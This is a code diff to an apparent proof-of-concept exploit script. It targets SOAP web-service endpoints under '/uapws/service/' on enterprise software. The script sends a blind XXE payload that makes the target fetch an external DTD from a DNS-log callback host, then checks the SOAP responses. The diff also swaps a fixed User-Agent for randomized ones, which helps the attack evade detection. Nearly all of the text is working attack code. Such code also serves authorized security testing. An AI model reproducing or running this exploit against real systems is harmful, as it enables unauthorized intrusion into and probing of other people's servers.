@@ -24,6 +24,7 @@ disable_warnings()
 path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 sys.path.append(path)
 from modules.dnslogs import dnslogs
+from modules import get_user_agent
 
 
 class poc:
@@ -31,7 +32,7 @@ class poc:
         self.url = url
         self.xxe_apis = ["nc.uap.oba.word.webservice.IServiceEntryPoint", "nc.uap.oba.wordWebservice.IServiceEntry", "nc.itf.bap.oba.IObaExcelService", "nc.itf.bap.oba.IObaWordService", "IReqQmyeToNcDataSrv"]
         self.headers = {
-            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
+            'Connection': 'close'
         }
         self.q = Queue()
         self.text_list = []
@@ -53,39 +54,40 @@ class poc:
             result_text = ""
             if self.q.qsize() == 0:
                 break
-            api = self.q.get_nowait()
-            url_api = api.split('.')
-            length = len(url_api)
-            iup = 'http://'
-            for i in range(length):
-                if i == length - 1:
-                    iup += url_api[i]
-                elif i == length - 2:
-                    iup += url_api[length - i - 2] + "/"
-                else:
-                    iup += url_api[length - i - 2] + "."
-            dnslog_all = dnslogs(self.proxies).get_dnslog()
-            dnslog = dnslog_all[0]
-            target_url = url + "/uapws/service/" + api
-            if url_api[length - 1] == "IObaExcelService":
-                get_result = "request"
-            else:
-                get_result = "getResult"
-            data = ""
-            data += "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:iup=\"{}\">\n".format(
-                iup)
-            data += "<soapenv:Header/>\n"
-            data += "<soapenv:Body>\n"
-            data += "<iup:{}>\n".format(get_result)
-            data += "<iup:string>\n"
-            data += "<![CDATA[\n"
-            data += "<!DOCTYPE xmlrootname [<!ENTITY % aaa SYSTEM \"http://{}/ext.dtd\">%aaa;]>\n".format(dnslog)
-            data += "<xxx/>]]>\n"
-            data += "</iup:string>\n"
-            data += "</iup:{}>\n".format(get_result)
-            data += "</soapenv:Body>\n"
-            data += "</soapenv:Envelope>"
             try:
+                api = self.q.get_nowait()
+                url_api = api.split('.')
+                length = len(url_api)
+                iup = 'http://'
+                for i in range(length):
+                    if i == length - 1:
+                        iup += url_api[i]
+                    elif i == length - 2:
+                        iup += url_api[length - i - 2] + "/"
+                    else:
+                        iup += url_api[length - i - 2] + "."
+                dnslog_all = dnslogs(self.proxies).get_dnslog()
+                dnslog = dnslog_all[0]
+                target_url = url + "/uapws/service/" + api
+                if url_api[length - 1] == "IObaExcelService":
+                    get_result = "request"
+                else:
+                    get_result = "getResult"
+                data = ""
+                data += "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:iup=\"{}\">\n".format(
+                    iup)
+                data += "<soapenv:Header/>\n"
+                data += "<soapenv:Body>\n"
+                data += "<iup:{}>\n".format(get_result)
+                data += "<iup:string>\n"
+                data += "<![CDATA[\n"
+                data += "<!DOCTYPE xmlrootname [<!ENTITY % aaa SYSTEM \"http://{}/ext.dtd\">%aaa;]>\n".format(dnslog)
+                data += "<xxx/>]]>\n"
+                data += "</iup:string>\n"
+                data += "</iup:{}>\n".format(get_result)
+                data += "</soapenv:Body>\n"
+                data += "</soapenv:Envelope>"
+                self.headers['User-Agent'] = get_user_agent.get_user_agent()
                 result = requests.post(url=target_url, data=data, headers=self.headers, verify=False, proxies=self.proxies)
                 if result.status_code == 200 and "<soap:Envelope" in result.text:
                     for i in range(5):
